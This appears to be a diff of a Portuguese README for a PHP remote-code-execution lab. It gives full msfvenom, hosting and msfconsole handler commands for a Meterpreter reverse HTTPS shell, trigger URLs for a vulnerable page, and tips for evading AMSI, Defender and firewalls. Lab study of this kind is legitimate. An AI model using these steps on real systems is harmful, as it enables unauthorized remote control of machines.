@@ -1,96 +1,124 @@
-<h1>PHP RCE Lab Demo (Apenas para Estudo)</h1>
+<h1>PHP RCE Lab Demo – Apenas para Estudo Educacional</h1>
+
+<div class="badge badge-red">APENAS EDUCACIONAL</div>
+<div class="badge badge-orange">AVISO LEGAL – CRIME SE USADO SEM AUTORIZAÇÃO</div>
 
 <div class="warning">
-AVISO LEGAL MUITO IMPORTANTE<br><br>
-Este repositório é <strong>exclusivamente educacional</strong> e deve ser usado 
-<strong>somente</strong> em ambientes isolados controlados por você 
-(máquinas virtuais locais, sem conexão com redes reais ou de terceiros).<br><br>
-Qualquer uso em sistemas sem autorização expressa e por escrito é crime 
-(no Brasil: art. 154-A do Código Penal + Lei 14.155/2021).<br><br>
-O autor <strong>não</strong> se responsabiliza por mau uso.
+    <strong>AVISO LEGAL OBRIGATÓRIO – LEIA ANTES DE USAR</strong><br><br>
+    Este repositório é <strong>exclusivamente educacional</strong> e destinado apenas a <strong>estudo e pesquisa em ambiente controlado</strong>.<br><br>
+    Deve ser usado <strong>somente</strong> em máquinas virtuais isoladas que você controla 100% (rede host-only ou NAT sem acesso à internet real ou a redes de terceiros).<br><br>
+    Qualquer uso em sistemas sem autorização expressa e <strong>por escrito</strong> constitui crime grave no Brasil:<br>
+    • Art. 154-A do Código Penal (invasão de dispositivo informático)<br>
+    • Lei nº 14.155/2021 (Lei Carolina Dieckmann)<br>
+    • LGPD e demais legislações aplicáveis<br><br>
+    O autor <strong>não</strong> se responsabiliza por qualquer uso indevido ou consequência decorrente deste material.
 </div>
 
 <h2>Objetivo deste repositório</h2>
-<p>Demonstrar de forma controlada e didática:</p>
+<p>Demonstrar de forma <strong>controlada e didática</strong>:</p>
 <ul>
-    <li>Como uma vulnerabilidade RCE (Remote Code Execution) pode ser explorada em PHP</li>
-    <li>Como payloads stageless do Metasploit (php/meterpreter_reverse_https) são entregues</li>
-    <li>Limitações atuais de detecção (AMSI, Defender, EDR) em 2026</li>
+    <li>Como uma vulnerabilidade RCE (Remote Code Execution) funciona em PHP</li>
+    <li>Como payloads stageless do Metasploit (ex: <code>php/meterpreter_reverse_https</code>) são entregues via RCE</li>
+    <li>Limitações reais de detecção em 2026 (AMSI, Windows Defender, EDRs como CrowdStrike/SentinelOne)</li>
+</ul>
+<p><strong>Este repositório NÃO é um exploit pronto para uso real. É apenas material de aprendizado.</strong></p>
+
+<h2>Ambiente Recomendado (obrigatório para uso seguro)</h2>
+<ul>
+    <li><strong>Atacante</strong>: VM Kali Linux / Parrot OS</li>
+    <li><strong>Vítima</strong>: VM Windows 10/11 ou Linux com XAMPP / Apache + PHP</li>
+    <li><strong>Rede</strong>: Host-Only ou NAT isolada (sem internet no alvo)</li>
+    <li><strong>Isolamento</strong>: Nunca conecte essas VMs à rede real ou a máquinas de terceiros</li>
 </ul>
 
-<p><strong>NÃO</strong> é um exploit funcional "pronto para usar" em ambientes reais.</p>
+<h2>Passo a passo – Como usar (apenas lab isolado)</h2>
 
-<h2>Como usar (apenas em lab isolado)</h2>
-
-<h3>1. Ambiente recomendado</h3>
-<ul>
-    <li>VM Kali/Parrot (atacante)</li>
-    <li>VM Windows 10/11 ou Linux (vítima) com XAMPP / Apache + PHP</li>
-    <li>Rede interna (Host-Only ou NAT sem internet no alvo)</li>
-</ul>
-
-<h3>2. Gerar o payload stageless</h3>
-
-<pre>
-msfvenom -p php/meterpreter_reverse_https \
+<h3>1. Gere o payload stageless (no atacante)</h3>
+<pre><code>msfvenom -p php/meterpreter_reverse_https \
   LHOST=192.168.56.101 \
   LPORT=443 \
-  -f raw > meter.php
-</pre>
+  -f raw > meter.php</code></pre>
 
-<h3>3. Hospedar o payload</h3>
-<pre>
-python3 -m http.server 8000
-</pre>
+<h3>2. Hospede o payload temporariamente</h3>
+<pre><code>cd pasta-onde-esta-o-meter.php
+python3 -m http.server 8000</code></pre>
 
-<h3>4. Iniciar o handler</h3>
-<pre>
-msfconsole -q -x "
+<h3>3. Inicie o handler no msfconsole (antes de acessar a página)</h3>
+<pre><code>msfconsole -q -x "
 use multi/handler;
 set payload php/meterpreter_reverse_https;
 set LHOST 192.168.56.101;
 set LPORT 443;
+set ExitOnSession false;
 exploit -j
-"
-</pre>
+"</code></pre>
 
-<h3>5. Acessar a página vulnerável</h3>
-<p>Copie o <code>vulnerable.php</code> para o servidor vítima (ex: <code>htdocs/vulnerable.php</code>)</p>
+<h3>4. Copie o arquivo <code>vulnerable.php</code> para a VM vítima</h3>
+<p>Coloque em <code>htdocs/vulnerable.php</code> (XAMPP) ou pasta do Apache</p>
 
-<pre>
-http://ip-da-vitima/vulnerable.php?payload=1
+<h3>5. Acesse e teste</h3>
+<pre><code>http://ip-da-vitima/vulnerable.php?payload=1
 http://ip-da-vitima/vulnerable.php?cmd=whoami&debug=1
-</pre>
+http://ip-da-vitima/vulnerable.php?cmd=ipconfig&debug=1</code></pre>
 
 <h2>Limitações reais em 2026</h2>
-<ul>
-    <li>Windows Defender + AMSI bloqueia payloads Metasploit conhecidos na maioria dos casos</li>
-    <li>EDRs (CrowdStrike, SentinelOne, etc.) detectam comportamento de reverse shell</li>
-    <li>Instalação silenciosa de .exe / .apk / .ipa não é viável sem interação do usuário</li>
-</ul>
+<table>
+    <thead>
+        <tr>
+            <th>Proteção</th>
+            <th>Chance de sucesso em ambiente protegido</th>
+            <th>Comentário</th>
+        </tr>
+    </thead>
+    <tbody>
+        <tr>
+            <td>Windows Defender + AMSI (padrão)</td>
+            <td>5–25%</td>
+            <td>Detecta eval() + base64 de payloads Metasploit</td>
+        </tr>
+        <tr>
+            <td>Defender + Cloud Protection</td>
+            <td>< 10%</td>
+            <td>Bloqueia na nuvem antes da execução</td>
+        </tr>
+        <tr>
+            <td>EDR (CrowdStrike, SentinelOne, etc.)</td>
+            <td>< 5%</td>
+            <td>Detecta comportamento de reverse shell</td>
+        </tr>
+        <tr>
+            <td>Instalação silenciosa (.exe/.apk)</td>
+            <td>Quase 0%</td>
+            <td>Exige interação do usuário ou 0-day</td>
+        </tr>
+    </tbody>
+</table>
 
-<h2>Recomendações</h2>
+<h2>Recomendações de Segurança (obrigatórias)</h2>
 <ul>
-    <li>Desative Defender/AMSI apenas no lab para fins de aprendizado</li>
-    <li>Nunca suba esse código em servidor real</li>
-    <li>Use sempre em VMs isoladas</li>
+    <li>Desative <strong>apenas no lab</strong>: Windows Defender real-time, AMSI (via PowerShell bypass clássico – use com cuidado)</li>
+    <li>Nunca exponha este código em servidor real, VPS, hospedagem compartilhada ou qualquer IP público</li>
+    <li>Use sempre VMs descartáveis e isoladas</li>
+    <li>Documente tudo que for detectado (prints do Defender, logs do EDR)</li>
 </ul>
 
 <h2>Licença</h2>
-<p>MIT – mas com a ressalva de que o uso indevido é de responsabilidade exclusiva do usuário.</p>
-<p><strong>Feito para estudo. Use com responsabilidade.</strong></p>
+<p>MIT License – mas com a <strong>ressalva explícita</strong> de que o uso indevido é de responsabilidade <strong>exclusiva</strong> do usuário.</p>
 
-<div class="note">
-<h3>O que fazer mais tarde (lembrete)</h3>
+<h2>Próximos passos sugeridos (para estudo)</h2>
 <ul>
-    <li>Testar em duas VMs (Kali + Windows 10/11)</li>
-    <li>Tentar o bypass AMSI básico via PowerShell antes do payload</li>
-    <li>Documentar o que foi detectado pelo Windows Defender (capturas de tela)</li>
-    <li>Experimentar variações: reverse_tcp vs reverse_https, porta 80 vs 443</li>
-    <li>Comparar com payload gerado com encoders (ex: -e php/base64)</li>
+    <li>Testar em duas VMs isoladas (Kali + Windows 11 24H2)</li>
+    <li>Tentar AMSI bypass básico via PowerShell antes do payload</li>
+    <li>Registrar detecções do Windows Defender (capturas de tela)</li>
+    <li>Comparar <code>reverse_tcp</code> vs <code>reverse_https</code></li>
+    <li>Testar portas comuns (80, 443, 53) para evasão de firewall</li>
+    <li>Experimentar encoders no msfvenom (<code>-e php/base64</code>, múltiplos encoders)</li>
+    <li>Documentar o que funciona / não funciona em 2026</li>
 </ul>
-</div>
 
 <footer>
-Boa sorte no estudo — e <strong>mantenha tudo isolado</strong>.
+    <p style="text-align:center; margin-top:4rem; color:#6c757d;">
+        Boa sorte nos estudos — <strong>mantenha tudo 100% isolado</strong>.<br>
+        Feito para aprendizado responsável.
+    </p>
 </footer>
